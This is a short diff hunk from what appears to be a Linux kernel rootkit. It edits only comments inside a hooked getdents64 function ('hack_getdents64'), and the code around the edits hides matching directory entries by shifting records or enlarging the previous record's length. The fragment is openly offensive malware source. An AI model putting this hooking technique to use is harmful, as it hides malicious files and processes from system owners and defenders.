@@ -149,14 +149,14 @@ static asmlinkage int hack_getdents64(unsigned int fd, struct linux_dirent64 __u
                 memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret); //move record start to the second dirent
                 continue;
             }
-            previous_dir->d_reclen += current_dir->d_reclen; // skip this dirent by increasing prevoius one's length record to make system skip to next one
+            previous_dir->d_reclen += current_dir->d_reclen; // skip this dirent by increasing prevoius one's length record by the current recortd length to make system skip to next one
         }
         else
         {
             previous_dir = current_dir; // if not matched, progress
         }
         
-        offset += current_dir->d_reclen; // incriment offset to next dirent
+        offset += current_dir->d_reclen; // increment offset to next dirent
 
     }
     
